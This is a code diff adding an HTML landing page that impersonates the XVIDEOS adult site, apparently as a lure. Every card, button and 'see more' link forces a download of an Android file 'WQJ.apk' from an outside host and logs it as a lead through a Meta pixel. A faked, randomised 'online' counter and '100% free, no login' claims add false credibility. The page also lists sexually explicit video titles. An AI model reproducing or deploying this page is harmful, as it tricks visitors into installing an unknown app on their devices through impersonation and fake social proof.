@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta name="facebook-domain-verification" content="p58b7meugr32xo9bbu75ftdoddxcqd" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#0d0d0f">
+<title>Free sex</title>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '29143883788609210');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=29143883788609210&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<style>
+:root {
+  --bg: #0d0d0f;
+  --card: #16161a;
+  --text: #f2f2f4;
+  --muted: #9a9aa3;
+  --accent: #ff2d55;
+  --border: #2a2a30;
+  --radius: 14px;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Noto Sans SC", sans-serif;
+  line-height: 1.4;
+  min-height: 100vh;
+  padding-bottom: 140px;
+}
+button { cursor: pointer; font: inherit; border: none; background: none; color: inherit; }
+.header {
+  position: sticky; top: 0; z-index: 50;
+  background: rgba(13,13,15,0.95);
+  backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--border);
+  padding: 10px 14px;
+  display: flex; align-items: center; justify-content: space-between;
+}
+.logo { font-size: 22px; font-weight: 800; color: #fff; letter-spacing: 0.5px; }
+.logo span { color: var(--accent); }
+.header-right { display: flex; align-items: center; gap: 8px; }
+.online-badge {
+  background: #1c1c22; border: 1px solid #2e2e36; border-radius: 20px;
+  padding: 5px 10px; font-size: 12px; color: #a0a0a8;
+  display: flex; align-items: center; gap: 5px;
+}
+.online-dot { width: 7px; height: 7px; background: #22c55e; border-radius: 50%; animation: pulse 1.5s infinite; }
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+.lang-select {
+  background: #1c1c22; border: 1px solid #2e2e36; color: #fff;
+  border-radius: 8px; padding: 5px 8px; font-size: 12px;
+}
+.cats {
+  padding: 12px 12px 6px; overflow-x: auto; white-space: nowrap;
+  display: flex; gap: 7px; scrollbar-width: none;
+}
+.cats::-webkit-scrollbar { display: none; }
+.cat {
+  flex-shrink: 0; padding: 7px 14px; border-radius: 20px;
+  background: #1a1a1f; border: 1px solid #2a2a30; color: #aaa; font-size: 13px;
+}
+.cat.active, .cat:hover {
+  background: var(--accent); border-color: var(--accent); color: #fff; font-weight: 600;
+}
+.search-wrap { padding: 6px 12px 10px; }
+.search {
+  width: 100%; background: #1a1a1f; border: 1px solid #2a2a30;
+  border-radius: 10px; padding: 10px 14px; color: #fff; font-size: 14px; outline: none;
+}
+.search:focus { border-color: var(--accent); }
+.sec-title {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 4px 14px 8px; font-size: 15px; font-weight: 700;
+}
+.sec-title span { color: var(--muted); font-size: 12px; font-weight: 400; }
+.grid {
+  display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; padding: 0 10px 16px;
+}
+@media (min-width: 600px) { .grid { grid-template-columns: repeat(3, 1fr); } }
+@media (min-width: 900px) { .grid { grid-template-columns: repeat(4, 1fr); } }
+@media (min-width: 1200px) { .grid { grid-template-columns: repeat(5, 1fr); } }
+.card {
+  background: var(--card); border-radius: var(--radius); overflow: hidden;
+  cursor: pointer; border: 1px solid transparent; transition: transform .15s;
+}
+.card:hover { transform: translateY(-2px); border-color: #3a3a42; }
+.cover {
+  position: relative; aspect-ratio: 3/4; background: #1a1a1f; overflow: hidden;
+}
+.cover img { width: 100%; height: 100%; object-fit: cover; display: block; }
+.cover-placeholder {
+  width: 100%; height: 100%; display: grid; place-items: center;
+  color: #555; font-size: 12px; background: #1a1a1f;
+}
+.live-badge {
+  position: absolute; top: 8px; left: 8px;
+  background: rgba(0,0,0,0.7); color: #fff; font-size: 11px; font-weight: 700;
+  padding: 3px 7px; border-radius: 6px; display: flex; align-items: center; gap: 4px;
+}
+.live-dot { width: 6px; height: 6px; background: #22c55e; border-radius: 50%; }
+.duration {
+  position: absolute; bottom: 8px; right: 8px;
+  background: rgba(0,0,0,0.75); color: #fff; font-size: 11px; font-weight: 600;
+  padding: 2px 6px; border-radius: 4px;
+}
+.card-info { padding: 8px 10px 10px; }
+.card-info h3 {
+  font-size: 13px; font-weight: 600; line-height: 1.3; margin-bottom: 4px;
+  display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;
+}
+.card-meta {
+  display: flex; justify-content: space-between; align-items: center;
+  font-size: 11px; color: var(--muted);
+}
+.dl-btn {
+  background: var(--accent); color: #fff; border-radius: 6px;
+  padding: 4px 9px; font-size: 11px; font-weight: 700;
+}
+.bottom-bar {
+  position: fixed; left: 0; right: 0; bottom: 0; z-index: 60;
+  padding: 10px 16px 16px;
+  background: linear-gradient(to top, rgba(13,13,15,0.98) 70%, transparent);
+  display: flex; flex-direction: column; align-items: center; gap: 8px;
+}
+.big-dl {
+  width: 100%; max-width: 420px;
+  background: linear-gradient(90deg, #ff2d55, #ff6b8a);
+  color: #fff; border: none; border-radius: 50px;
+  padding: 15px 20px; font-size: 16px; font-weight: 800;
+  box-shadow: 0 6px 20px rgba(255,45,85,0.4);
+}
+.more-btn {
+  width: 100%; max-width: 420px;
+  background: #1c1c22;
+  border: 1px solid #3a3a42;
+  color: #fff;
+  border-radius: 50px;
+  padding: 12px 20px;
+  font-size: 14px;
+  font-weight: 600;
+}
+.bottom-tip { font-size: 11px; color: #888; }
+.empty {
+  display: none; text-align: center; padding: 60px 20px; color: #666;
+}
+/* Arabic RTL support */
+html[dir="rtl"] .sec-title,
+html[dir="rtl"] .card-meta {
+  direction: rtl;
+}
+</style>
+</head>
+<body>
+<div class="header">
+  <div class="logo">XVIDEOS</div>
+  <div class="header-right">
+    <div class="online-badge">
+      <div class="online-dot"></div>
+      <span id="onlineCount">Online 14,340</span>
+    </div>
+    <select id="languageSelect" class="lang-select">
+      <option value="auto">🌐</option>
+      <option value="zh-TW">繁中</option>
+      <option value="en">EN</option>
+      <option value="ja">日本語</option>
+      <option value="ko">한국어</option>
+      <option value="hi">हिन्दी</option>
+      <option value="fr">Français</option>
+      <option value="de">Deutsch</option>
+      <option value="es">Español</option>
+      <option value="ar">العربية</option>
+    </select>
+  </div>
+</div>
+<div class="cats" id="cats">
+  <button class="cat active" data-category="all">All</button>
+  <button class="cat" data-category="live">Live</button>
+  <button class="cat" data-category="ai">AI</button>
+  <button class="cat" data-category="anime">Anime</button>
+  <button class="cat" data-category="europe">Western</button>
+  <button class="cat" data-category="asian">Asian</button>
+  <button class="cat" data-category="homemade">Homemade</button>
+  <button class="cat" data-category="lesbian">Lesbian</button>
+  <button class="cat" data-category="threesome">3P</button>
+  <button class="cat" data-category="anal">Anal</button>
+  <button class="cat" data-category="longlegs">Long Legs</button>
+</div>
+<div class="search-wrap">
+  <input class="search" id="searchInput" type="search" placeholder="Search...">
+</div>
+<div id="content"></div>
+<div class="empty" id="empty">No videos found</div>
+<div class="bottom-bar">
+  <button class="big-dl" id="bigDownload">↓ Download · Watch Free · No Login</button>
+  <button class="more-btn" id="moreBtn">Click to see more</button>
+  <div class="bottom-tip">100% Free · No registration · No fee</div>
+</div>
+<script>
+const DOWNLOAD_API_BASE = "https://prkqy.superdog-ph.net/prkqy/xvideos";
+const VIDEO_LIBRARY = [
+  {id:"v015", category:"live", title:{"zh-TW":"直播回放精選","en":"Live Replay","ja":"ライブ再生","ko":"라이브 다시보기","hi":"लाइव रीप्ले","fr":"Replay Live","de":"Live Replay"}, cover:"v015.webp", duration:"45:00", views:"56.8K", live:true},
+  {id:"v024", category:"live", title:{"zh-TW":"午夜直播專場","en":"Midnight Live","ja":"深夜ライブ","ko":"심야 라이브","hi":"मिडनाइट लाइव","fr":"Live de Minuit","de":"Mitternachts-Live"}, cover:"v024.webp", duration:"38:20", views:"72.4K", live:true},
+  {id:"v025", category:"live", title:{"zh-TW":"情侶直播實錄","en":"Couple Live","ja":"カップルライブ","ko":"커플 라이브","hi":"कपल लाइव","fr":"Live de Couple","de":"Paar-Live"}, cover:"v025.webp", duration:"52:10", views:"91.3K", live:true},
+  {id:"v026", category:"live", title:{"zh-TW":"主播私房直播","en":"Private Live","ja":"プライベートライブ","ko":"프라이빗 라이브","hi":"प्राइवेट लाइव","fr":"Live Privé","de":"Privates Live"}, cover:"v026.webp", duration:"41:55", views:"68.7K", live:true},
+  {id:"v027", category:"live", title:{"zh-TW":"熱門直播精華","en":"Popular Live","ja":"人気ライブ","ko":"인기 라이브","hi":"पॉपुलर लाइव","fr":"Live Populaire","de":"Beliebtes Live"}, cover:"v027.webp", duration:"33:40", views:"105K", live:true},
+  {id:"v028", category:"live", title:{"zh-TW":"Yui Takahashi 直播","en":"Yui Live","ja":"Yui ライブ","ko":"Yui 라이브","hi":"Yui लाइव","fr":"Yui Live","de":"Yui Live"}, cover:"v028.webp", duration:"28:15", views:"48.2K", live:true},
+  {id:"v029", category:"live", title:{"zh-TW":"Rina Sato 在線","en":"Rina Live","ja":"Rina ライブ","ko":"Rina 라이브","hi":"Rina लाइव","fr":"Rina Live","de":"Rina Live"}, cover:"v029.webp", duration:"35:40", views:"61.9K", live:true},
+  {id:"v030", category:"live", title:{"zh-TW":"Miu Tanaka 直播中","en":"Miu Live","ja":"Miu ライブ","ko":"Miu 라이브","hi":"Miu लाइव","fr":"Miu Live","de":"Miu Live"}, cover:"v030.webp", duration:"22:50", views:"39.4K", live:true},
+  {id:"v013", category:"ai", title:{"zh-TW":"AI生成虛擬女友","en":"AI Girlfriend","ja":"AI彼女","ko":"AI 여친","hi":"AI गर्लफ्रेंड","fr":"Petite amie IA","de":"KI-Freundin"}, cover:"v013.webp", duration:"6:40", views:"112K"},
+  {id:"v016", category:"ai", title:{"zh-TW":"AI完美身材模特","en":"AI Perfect Body","ja":"AI完璧ボディ","ko":"AI 완벽한 몸매","hi":"AI परफेक्ट बॉडी","fr":"Corps parfait IA","de":"KI Perfekter Körper"}, cover:"v016.webp", duration:"8:15", views:"87.3K"},
+  {id:"v017", category:"ai", title:{"zh-TW":"AI辦公室幻想","en":"AI Office","ja":"AIオフィス","ko":"AI 사무실","hi":"AI ऑफिस","fr":"Bureau IA","de":"KI Büro"}, cover:"v017.webp", duration:"11:20", views:"64.8K"},
+  {id:"v018", category:"ai", title:{"zh-TW":"AI浴室私密","en":"AI Bathroom","ja":"AIバスルーム","ko":"AI 욕실","hi":"AI बाथरूम","fr":"Salle de bain IA","de":"KI Badezimmer"}, cover:"v018.webp", duration:"7:55", views:"93.1K"},
+  {id:"v019", category:"ai", title:{"zh-TW":"AI夜店激情","en":"AI Nightclub","ja":"AIナイトクラブ","ko":"AI 나이트클럽","hi":"AI नाइटक्लब","fr":"Boîte de nuit IA","de":"KI Nachtclub"}, cover:"v019.webp", duration:"9:40", views:"71.5K"},
+  {id:"v031", category:"ai", title:{"zh-TW":"AI 黑絲長腿","en":"AI Long Legs","ja":"AI美脚","ko":"AI 롱레그","hi":"AI लॉन्ग लेग्स","fr":"Longues jambes IA","de":"KI Lange Beine"}, cover:"v031.webp", duration:"10:05", views:"58.7K"},
+  {id:"v014", category:"anime", title:{"zh-TW":"二次元動漫特輯","en":"2D Anime","ja":"二次元アニメ","ko":"2D 애니","hi":"2D एनीमे","fr":"Anime 2D","de":"2D Anime"}, cover:"v014.webp", duration:"18:20", views:"203K"},
+  {id:"v020", category:"anime", title:{"zh-TW":"二次元女僕侍奉","en":"2D Maid","ja":"メイド","ko":"メイド","hi":"2D मेड","fr":"Maid 2D","de":"2D Maid"}, cover:"v020.webp", duration:"14:35", views:"156K"},
+  {id:"v021", category:"anime", title:{"zh-TW":"校園動漫學姐","en":"School Anime","ja":"学園先輩","ko":"학원 선배","hi":"स्कूल एनीमे","fr":"Anime école","de":"Schul-Anime"}, cover:"v021.webp", duration:"16:10", views:"128K"},
+  {id:"v022", category:"anime", title:{"zh-TW":"幻想世界精靈","en":"Fantasy Elf","ja":"エルフ","ko":"엘프","hi":"फैंटेसी एल्फ","fr":"Elfe fantastique","de":"Fantasy-Elfe"}, cover:"v022.webp", duration:"12:45", views:"97.6K"},
+  {id:"v023", category:"anime", title:{"zh-TW":"機甲少女特輯","en":"Mecha Girl","ja":"メカ少女","ko":"메카 소녀","hi":"मेका गर्ल","fr":"Fille Mecha","de":"Mecha-Mädchen"}, cover:"v023.webp", duration:"15:30", views:"76.3K"},
+  {id:"v032", category:"anime", title:{"zh-TW":"貓耳娘特輯","en":"Catgirl","ja":"猫耳娘","ko":"고양이귀","hi":"कैटगर्ल","fr":"Catgirl","de":"Catgirl"}, cover:"v032.webp", duration:"15:30", views:"76.3K"},
+  {id:"v001", category:"europe", title:{"zh-TW":"我和老闆的妻子","en":"Boss Wife","ja":"ボスの妻","ko":"보스 아내","hi":"बॉस वाइफ","fr":"Femme du boss","de":"Boss Frau"}, cover:"v001.webp", duration:"10:51", views:"5.1K"},
+  {id:"v002", category:"homemade", title:{"zh-TW":"妻子總是飢渴難耐","en":"Horny Wife","ja":"興奮した妻","ko":"흥분한 아내","hi":"हॉर्नी वाइफ","fr":"Femme excitée","de":"Geile Frau"}, cover:"v002.webp", duration:"7:15", views:"16.9K"},
+  {id:"v003", category:"asian", title:{"zh-TW":"從乳頭到陰蒂","en":"Nipple to Clit","ja":"乳首からクリ","ko":"젖꼭지부터 클리","hi":"निपल टू क्लिट","fr":"Mamelon au clito","de":"Brustwarze bis Kitzler"}, cover:"v003.webp", duration:"4:00", views:"18.2K"},
+  {id:"v004", category:"lesbian", title:{"zh-TW":"黑髮姐妹花","en":"Brunette Lesbians","ja":"黒髪レズ","ko":"검은머리 레즈","hi":"ब्रुनेट लेस्बियन","fr":"Lesbiennes brunes","de":"Brünette Lesben"}, cover:"v004.webp", duration:"10:51", views:"8.3K"},
+  {id:"v005", category:"europe", title:{"zh-TW":"聖誕特別篇","en":"Xmas Special","ja":"クリスマス","ko":"크리스마스","hi":"क्रिसमस स्पेशल","fr":"Spécial Noël","de":"Weihnachts-Special"}, cover:"v005.webp", duration:"11:17", views:"248K"},
+  {id:"v006", category:"threesome", title:{"zh-TW":"兩個飢渴女孩3P","en":"Threesome","ja":"3P","ko":"쓰리섬","hi":"थ्रीसम","fr":"Plan à trois","de":"Dreier"}, cover:"v006.webp", duration:"15:07", views:"19.1K"},
+  {id:"v007", category:"anal", title:{"zh-TW":"Sasha Paige 雙插","en":"DP Action","ja":"DP","ko":"DP","hi":"डीपी एक्शन","fr":"Action DP","de":"DP Action"}, cover:"v007.webp", duration:"38:03", views:"713K"},
+  {id:"v008", category:"longlegs", title:{"zh-TW":"紅衣長腿金髮","en":"Long Legs Blonde","ja":"ロングレッグ","ko":"롱레그 금발","hi":"लॉन्ग लेग्स ब्लॉन्ड","fr":"Longues jambes blonde","de":"Lange Beine Blond"}, cover:"v008.webp", duration:"12:40", views:"42.6K"},
+  {id:"v009", category:"asian", title:{"zh-TW":"日本無碼成熟","en":"JP Mature","ja":"熟女","ko":"숙녀","hi":"जेपी मैच्योर","fr":"Mature JP","de":"JP Reif"}, cover:"v009.webp", duration:"22:15", views:"89.3K"},
+  {id:"v010", category:"homemade", title:{"zh-TW":"業餘情侶高潮","en":"Amateur Couple","ja":"素人カップル","ko":"아마추어 커플","hi":"अमेच्योर कपल","fr":"Couple amateur","de":"Amateur-Paar"}, cover:"v010.webp", duration:"9:28", views:"31.7K"},
+  {id:"v011", category:"europe", title:{"zh-TW":"老闆妻子的秘密","en":"Boss Wife Secret","ja":"ボスの妻の秘密","ko":"보스 아내 비밀","hi":"बॉस वाइफ सीक्रेट","fr":"Secret femme du boss","de":"Boss Frau Geheimnis"}, cover:"v011.webp", duration:"14:02", views:"67.4K"},
+  {id:"v012", category:"lesbian", title:{"zh-TW":"紅色內衣女女","en":"Red Lingerie","ja":"赤いランジェリー","ko":"빨간 란제리","hi":"रेड लिंजरी","fr":"Lingerie rouge","de":"Rote Lingerie"}, cover:"v012.webp", duration:"8:55", views:"25.8K"}
+];
+const I18N = {
+  "zh-TW": { all:"全部", live:"直播", ai:"AI視頻", anime:"動漫", europe:"歐美", asian:"亞洲", homemade:"自製", lesbian:"女同", threesome:"3P", anal:"肛門", longlegs:"長腿", search:"搜尋標題...", empty:"找不到視頻", dl:"下載", big:"↓ 下載立即免費觀看 · 免登入", more:"點擊查看更多", tip:"100% 免費 · 無需註冊 · 無月費", online:"在線 " },
+  en: { all:"All", live:"Live", ai:"AI", anime:"Anime", europe:"Western", asian:"Asian", homemade:"Homemade", lesbian:"Lesbian", threesome:"3P", anal:"Anal", longlegs:"Long Legs", search:"Search...", empty:"No videos found", dl:"Download", big:"↓ Download · Watch Free · No Login", more:"Click to see more", tip:"100% Free · No registration · No fee", online:"Online " },
+  ja: { all:"すべて", live:"ライブ", ai:"AI", anime:"アニメ", europe:"欧米", asian:"アジア", homemade:"素人", lesbian:"レズ", threesome:"3P", anal:"アナル", longlegs:"美脚", search:"検索...", empty:"動画なし", dl:"ダウンロード", big:"↓ ダウンロードして無料視聴", more:"もっと見る", tip:"100%無料 · 登録不要", online:"オンライン " },
+  ko: { all:"전체", live:"라이브", ai:"AI", anime:"애니", europe:"서양", asian:"아시아", homemade:"홈메이드", lesbian:"레즈", threesome:"쓰리섬", anal:"애널", longlegs:"롱레그", search:"검색...", empty:"영상 없음", dl:"다운로드", big:"↓ 다운로드 후 무료 시청", more:"더 보기", tip:"100% 무료 · 가입 불필요", online:"온라인 " },
+  hi: { all:"सभी", live:"लाइव", ai:"AI", anime:"एनीमे", europe:"वेस्टर्न", asian:"एशियन", homemade:"होममेड", lesbian:"लेस्बियन", threesome:"थ्रीसम", anal:"एनल", longlegs:"लॉन्ग लेग्स", search:"खोजें...", empty:"कोई वीडियो नहीं", dl:"डाउनलोड", big:"↓ डाउनलोड · मुफ्त देखें · बिना लॉगिन", more:"और देखें", tip:"100% मुफ्त · बिना रजिस्ट्रेशन", online:"ऑनलाइन " },
+  fr: { all:"Tout", live:"Live", ai:"IA", anime:"Anime", europe:"Occidental", asian:"Asiatique", homemade:"Amateur", lesbian:"Lesbienne", threesome:"Plan à 3", anal:"Anal", longlegs:"Longues jambes", search:"Rechercher...", empty:"Aucune vidéo", dl:"Télécharger", big:"↓ Télécharger · Regarder gratuitement", more:"Voir plus", tip:"100% Gratuit · Sans inscription", online:"En ligne " },
+  de: { all:"Alle", live:"Live", ai:"KI", anime:"Anime", europe:"Western", asian:"Asiatisch", homemade:"Homemade", lesbian:"Lesbisch", threesome:"Dreier", anal:"Anal", longlegs:"Lange Beine", search:"Suchen...", empty:"Keine Videos", dl:"Download", big:"↓ Download · Kostenlos ansehen", more:"Mehr sehen", tip:"100% Kostenlos · Keine Anmeldung", online:"Online " },
+  es: { all:"Todo", live:"En vivo", ai:"IA", anime:"Anime", europe:"Occidental", asian:"Asiático", homemade:"Casero", lesbian:"Lesbianas", threesome:"Trío", anal:"Anal", longlegs:"Piernas largas", search:"Buscar títulos...", empty:"No se encontraron videos", dl:"Descargar", big:"↓ Descargar · Ver gratis · Sin iniciar sesión", more:"Haz clic para ver más", tip:"100% gratis · Sin registro · Sin cuotas", online:"En línea " },
+  ar: { all:"الكل", live:"مباشر", ai:"ذكاء اصطناعي", anime:"أنمي", europe:"غربي", asian:"آسيوي", homemade:"منزلي", lesbian:"سحاقي", threesome:"ثلاثي", anal:"شرجي", longlegs:"أرجل طويلة", search:"ابحث عن العناوين...", empty:"لم يتم العثور على فيديوهات", dl:"تنزيل", big:"↓ تنزيل · مشاهدة مجانية · بدون تسجيل دخول", more:"انقر لعرض المزيد", tip:"مجاني 100% · لا يلزم التسجيل · بدون رسوم", online:"متصل " }
+};
+let currentCategory = "all";
+let currentLanguage = "en";
+const $ = s => document.querySelector(s);
+function t(key) {
+  return (I18N[currentLanguage] && I18N[currentLanguage][key]) || I18N.en[key] || key;
+}
+function loc(obj) {
+  if (!obj) return "";
+  if (typeof obj === "string") return obj;
+  return obj[currentLanguage] || obj.en || obj["zh-TW"] || Object.values(obj)[0] || "";
+}
+function normalizeLang(raw) {
+  if (!raw) return "en";
+  const l = String(raw).toLowerCase();
+  if (l.includes("zh-tw") || l.includes("zh-hk") || l.includes("hant")) return "zh-TW";
+  if (l.startsWith("ja")) return "ja";
+  if (l.startsWith("ko")) return "ko";
+  if (l.startsWith("hi")) return "hi";
+  if (l.startsWith("fr")) return "fr";
+  if (l.startsWith("de")) return "de";
+  if (l.startsWith("es")) return "es";
+  if (l.startsWith("ar")) return "ar";
+  if (l.startsWith("en")) return "en";
+  return "en";
+}
+function detectLang() {
+  const list = navigator.languages || [navigator.language || "en"];
+  for (let i = 0; i < list.length; i++) {
+    const n = normalizeLang(list[i]);
+    if (I18N[n]) return n;
+  }
+  return "en";
+}
+function setLang(choice) {
+  currentLanguage = (choice === "auto") ? detectLang() : normalizeLang(choice);
+  document.documentElement.lang = currentLanguage;
+  document.documentElement.dir = currentLanguage === "ar" ? "rtl" : "ltr";
+  try { localStorage.setItem("wqj-lang", choice); } catch(e) {}
+  const sel = $("#languageSelect");
+  if (sel) sel.value = choice;
+  document.querySelectorAll(".cat").forEach(btn => {
+    const key = btn.getAttribute("data-category");
+    if (key) btn.textContent = t(key);
+  });
+  const search = $("#searchInput");
+  if (search) search.placeholder = t("search");
+  const empty = $("#empty");
+  if (empty) empty.textContent = t("empty");
+  const big = $("#bigDownload");
+  if (big) big.textContent = t("big");
+  const more = $("#moreBtn");
+  if (more) more.textContent = t("more");
+  const tip = document.querySelector(".bottom-tip");
+  if (tip) tip.textContent = t("tip");
+  const online = $("#onlineCount");
+  if (online) online.textContent = t("online") + "14,340";
+  render();
+}
+function visible() {
+  const input = $("#searchInput");
+  const q = input ? input.value.trim().toLowerCase() : "";
+  return VIDEO_LIBRARY.filter(v => {
+    const catOk = currentCategory === "all" || v.category === currentCategory;
+    const text = (loc(v.title) + " " + (v.category || "")).toLowerCase();
+    return catOk && text.indexOf(q) !== -1;
+  });
+}
+function createCard(v) {
+  const title = loc(v.title);
+  const cover = v.cover || "";
+  return '<article class="card" data-id="' + v.id + '">' +
+    '<div class="cover">' +
+      (cover ? '<img src="' + cover + '" alt="' + title + '" loading="lazy" onerror="this.style.display=\'none\';this.nextElementSibling.style.display=\'grid\'"><div class="cover-placeholder" style="display:none">No Cover</div>' : '<div class="cover-placeholder">No Cover</div>') +
+      (v.live ? '<div class="live-badge"><div class="live-dot"></div>LIVE</div>' : '') +
+      '<div class="duration">' + (v.duration || '') + '</div>' +
+    '</div>' +
+    '<div class="card-info">' +
+      '<h3>' + title + '</h3>' +
+      '<div class="card-meta">' +
+        '<span>👁 ' + (v.views || '0') + '</span>' +
+        '<button class="dl-btn" data-id="' + v.id + '">' + t("dl") + '</button>' +
+      '</div>' +
+    '</div>' +
+  '</article>';
+}
+function render() {
+  try {
+    const list = visible();
+    const box = $("#content");
+    if (!box) return;
+    box.innerHTML = "";
+    const empty = $("#empty");
+    if (!list || list.length === 0) {
+      if (empty) empty.style.display = "block";
+      return;
+    }
+    if (empty) empty.style.display = "none";
+    const order = [
+      {cat: "live", title: t("live")},
+      {cat: "ai", title: t("ai")},
+      {cat: "anime", title: t("anime")},
+      {cat: "other", title: "Hot"}
+    ];
+    order.forEach(function(g) {
+      let items = [];
+      if (currentCategory !== "all") {
+        if (g.cat !== currentCategory && !(g.cat === "other" && ["europe","asian","homemade","lesbian","threesome","anal","longlegs"].indexOf(currentCategory) !== -1)) return;
+        items = list;
+      } else {
+        if (g.cat === "other") {
+          items = list.filter(function(v) { return ["live","ai","anime"].indexOf(v.category) === -1; });
+        } else {
+          items = list.filter(function(v) { return v.category === g.cat; });
+        }
+      }
+      if (!items.length) return;
+      const sec = document.createElement("div");
+      sec.innerHTML = '<div class="sec-title">' + g.title + ' <span>' + items.length + '</span></div>' +
+        '<div class="grid">' + items.map(createCard).join("") + '</div>';
+      box.appendChild(sec);
+    });
+  } catch (err) {
+    console.error("render error:", err);
+  }
+}
+function download(position) {
+  try {
+    fbq('track', 'Lead', {
+      content_name: 'WQJ_APK',
+      position: position
+    });
+  } catch(e) {}
+  try {
+    fbq('trackCustom', 'Download', {
+      content_name: 'WQJ_APK',
+      position: position
+    });
+  } catch(e) {}
+ 
+  const a = document.createElement("a");
+  a.href = DOWNLOAD_API_BASE;
+  a.download = "WQJ.apk";
+  a.style.display = "none";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+document.addEventListener("DOMContentLoaded", function() {
+  const content = $("#content");
+  if (content) {
+    content.addEventListener("click", function(e) {
+      const btn = e.target.closest(".dl-btn");
+      if (btn) {
+        const vid = btn.getAttribute('data-id') || 'unknown';
+        download('card_download_' + vid);
+        e.stopPropagation();
+        return;
+      }
+      const card = e.target.closest(".card");
+      if (card) {
+        const vid = card.getAttribute('data-id') || 'unknown';
+        download('card_click_' + vid);
+      }
+    });
+  }
+  const cats = $("#cats");
+  if (cats) {
+    cats.addEventListener("click", function(e) {
+      const btn = e.target.closest(".cat");
+      if (!btn) return;
+      currentCategory = btn.getAttribute("data-category");
+      document.querySelectorAll(".cat").forEach(function(c) {
+        c.classList.toggle("active", c === btn);
+      });
+      render();
+    });
+  }
+  const search = $("#searchInput");
+  if (search) search.addEventListener("input", render);
+  const langSel = $("#languageSelect");
+  if (langSel) langSel.addEventListener("change", function(e) { setLang(e.target.value); });
+  // 底部大按鈕 → 直接下載 + 追蹤 bottom_big_download
+  const bigBtn = $("#bigDownload");
+  if (bigBtn) bigBtn.addEventListener("click", function(){ download('bottom_big_download'); });
+  // 查看更多按鈕 → 也直接下載 + 追蹤 bottom_see_more
+  const moreBtn = $("#moreBtn");
+  if (moreBtn) moreBtn.addEventListener("click", function(){ download('bottom_see_more'); });
+  let pref = "auto";
+  try { pref = localStorage.getItem("wqj-lang") || "auto"; } catch(e) {}
+  setLang(pref);
+  setInterval(function() {
+    const base = 14340;
+    const n = base + Math.floor(Math.random() * 80 - 40);
+    const el = $("#onlineCount");
+    if (el) el.textContent = t("online") + n.toLocaleString();
+  }, 4000);
+});
+</script>
+</body>
+</html>
+# Live
